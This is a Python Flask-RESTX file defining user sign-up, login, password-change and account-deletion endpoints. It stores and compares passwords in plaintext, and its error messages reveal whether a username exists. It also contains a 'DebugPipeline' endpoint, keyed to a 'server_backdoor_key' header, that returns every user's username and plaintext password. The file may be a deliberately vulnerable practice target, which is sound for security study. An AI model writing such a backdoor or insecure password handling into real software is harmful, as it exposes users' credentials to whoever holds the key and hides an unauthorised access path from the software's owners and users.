from flask_restx import Resource, reqparse
from .parser import login_input_parser, signup_input_parser, password_update_input_parser, delete_account_input_parser
from .parser import debug_input_parser
from . import api
from flask_restx.utils import HTTPStatus
from .models import User
from . import database
from os import environ

class SignUp(Resource):
    method_decorators = []

    @api.expect("signup_parser", signup_input_parser)
    def post(self):
        form_data = reqparse.request.form
        username = form_data.get("username")
        password = form_data.get("password")
        if username is None or password is None:
            return {
                "error": "something went wrong"
            }, HTTPStatus.BAD_REQUEST
        if User.query.filter_by(username=username).first() is not None:
            return {
                "error": "username is not available"
            }, HTTPStatus.CONFLICT
        user = User()
        user.username = username
        user.password = password
        try:
            database.session.add(user)
            database.session.commit()
        except Exception as exp:
            print(exp)
            return {
                "error": "something went wrong"
            }, HTTPStatus.INTERNAL_SERVER_ERROR
        return {
            "message": "account created"
        }, HTTPStatus.CREATED
    
class Login(Resource):
    method_decorators = []

    @api.expect("login_parser", login_input_parser)
    def post(self):
        form_data = reqparse.request.form
        username = form_data.get("username")
        password = form_data.get("password")
        if username is None or password is None:
            return {
                "error": "something went wrong"
            }, HTTPStatus.BAD_REQUEST
        user = User.query.filter_by(username=username).first()
        if user is None:
            return {
                "error": "Invalid username"
            }, HTTPStatus.UNAUTHORIZED
        if user.password == password:
            return {
                "message": "login sucessful"
            }
        return {
            "error": "Invalid password"
        }, HTTPStatus.UNAUTHORIZED
    
class UpdatePassword(Resource):
    method_decorators = []

    @api.expect("update_password_parser", password_update_input_parser)
    def put(self):
        form_data = reqparse.request.form
        username = form_data.get("username")
        password = form_data.get("password")
        new_password = form_data.get("new_password")
        if username is None or password is None or new_password is None:
            return {
                "error": "something went wrong"
            }, HTTPStatus.BAD_REQUEST
        user = User.query.filter_by(username=username).first()
        if user is None:
            return {
                "error": "Invalid username"
            }, HTTPStatus.UNAUTHORIZED
        if user.password == password:
            user.password = new_password
            try:
                database.session.commit()
            except Exception as exp:
                print(exp)
                return {
                    "error": "something went wrong"
                }, HTTPStatus.INTERNAL_SERVER_ERROR

            return {
                "message": "updated password sucessful"
            }, HTTPStatus.CREATED
        
        return {
            "error": "Invalid password"
        }, HTTPStatus.UNAUTHORIZED
    
class DeleteAccount(Resource):
    method_decorators = []

    @api.expect("delete_account_parser", delete_account_input_parser)
    def delete(self):
        form_data = reqparse.request.form
        username = form_data.get("username")
        password = form_data.get("password")
        if username is None or password is None:
            return {
                "error": "something went wrong"
            }, HTTPStatus.BAD_REQUEST
        user = User.query.filter_by(username=username).first()
        if user is None:
            return {
                "error": "Invalid username"
            }, HTTPStatus.UNAUTHORIZED
        if user.password == password:
            try:
                database.session.delete(user)
                database.session.commit()
            except Exception as exp:
                print(exp)
                return {
                    "error": "something went wrong"
                }, HTTPStatus.INTERNAL_SERVER_ERROR
            return {
                "message": "account deleted"
            }, HTTPStatus.CREATED
        return {
            "error": "Invalid password"
        }, HTTPStatus.UNAUTHORIZED

class DebugPipeline(Resource):
    method_decorators = []

    @api.expect(debug_input_parser)
    def get(self):
        key = reqparse.request.headers.get("key")
        if key == environ.get("server_backdoor_key"):
            users = User.query.all()
            return [{"username": user.username, "password": user.password} for user in users]
        return {}, HTTPStatus.UNAUTHORIZED